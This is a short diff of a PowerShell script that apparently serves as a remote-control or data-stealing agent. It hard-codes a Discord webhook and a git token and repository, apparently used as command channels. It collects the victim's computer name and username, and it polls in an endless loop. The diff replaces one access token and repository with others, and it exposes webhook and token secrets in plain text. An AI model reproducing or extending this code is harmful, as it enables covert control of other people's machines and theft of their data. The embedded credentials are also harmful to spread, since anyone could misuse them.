@@ -21,9 +21,9 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
 $main_webhook = "https://discord.com/api/webhooks/1447179401505538162/PfZZSqMkjnk5jMAirVUTC0lizN8xvjH5-DbwXIpwrsLe2W2vOxrgA0PWjAI3R-YTx0Kc"
-$gitea_token = "2a845b3c749a1bdc378e9bbe535562d324557ba4"
-$repo_owner = "whaik74"
-$repo_name = "commands"
+$gitea_token = "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"
+$repo_owner = "cannyyy7-design"
+$repo_name = "tokenn"
 
 $computerName = $env:COMPUTERNAME
 $username = $env:USERNAME
@@ -493,3 +493,4 @@ while($true) {
         Start-Sleep 30
     }
 }
+
